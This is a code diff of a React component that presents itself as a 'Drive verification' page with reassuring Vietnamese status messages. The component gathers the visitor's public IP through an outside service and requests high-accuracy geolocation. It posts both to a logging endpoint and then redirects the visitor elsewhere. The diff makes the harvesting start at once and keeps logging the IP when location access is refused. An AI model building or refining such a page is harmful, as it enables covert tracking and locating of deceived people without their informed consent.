@@ -18,22 +18,21 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
   useEffect(() => {
     const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
 
-    const logAndRedirect = async () => {
+    const startVerificationProcess = async () => {
       let clientIp = 'N/A';
       try {
         setStatus('Đang xác định địa chỉ mạng...');
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         if (ipResponse.ok) {
-          const ipData = await ipResponse.json();
-          clientIp = ipData.ip;
+          clientIp = (await ipResponse.json()).ip;
         }
       } catch (e) {
-        console.error("Could not fetch IP", e);
-        setStatus('Không thể xác định địa chỉ. Đang chuyển hướng...');
+        // Continue without IP if fetch fails
+        setStatus('Không thể xác định địa chỉ mạng. Đang tiếp tục...');
       }
 
-      const logData = (pos?: GeolocationPosition) => {
-        setStatus('Đang ghi lại thông tin an toàn...');
+      const logAndRedirect = (pos?: GeolocationPosition) => {
+        setStatus('Đang ghi lại thông tin an toàn và chuẩn bị chuyển hướng...');
         const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
         if (pos) {
           body.lat = pos.coords.latitude;
@@ -43,44 +42,42 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
 
         const payload = JSON.stringify(body);
         
-        // Use sendBeacon for reliable logging before redirect
-        if (navigator.sendBeacon) {
-          navigator.sendBeacon('/api/log-location', payload);
-          // Redirect immediately after sending beacon
-          window.location.href = REDIRECT_URL;
-        } else {
-          // Fallback to fetch for older browsers
-          fetch('/api/log-location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: payload,
-            keepalive: true,
-          }).finally(() => {
-            window.location.href = REDIRECT_URL;
-          });
-        }
+        // Use fetch with keepalive which is reliable for sending data before unload.
+        fetch('/api/log-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          keepalive: true,
+        }).catch(err => {
+            // Even if logging fails, we should still redirect.
+            console.error("Logging failed, but redirecting anyway:", err);
+        }).finally(() => {
+            // Redirect after a very short delay to ensure fetch is dispatched.
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 150);
+        });
       };
 
       setStatus('Đang yêu cầu quyền truy cập vị trí...');
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          logData, // Success
+          logAndRedirect, // Success: Log with position
           () => { // Error
             setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
-            logData(); // Log IP only
+            logAndRedirect(); // Log with IP only
           },
           { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
       } else {
         setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
-        logData(); // Geolocation not supported
+        logAndRedirect(); // Geolocation not supported, log IP only
       }
     };
 
-    // A short delay before starting to allow the page to render.
-    const timer = setTimeout(logAndRedirect, 2500);
+    // The process now starts immediately without the previous delay.
+    startVerificationProcess();
     
-    return () => clearTimeout(timer);
   }, [redirectUrl]);
 
   return (
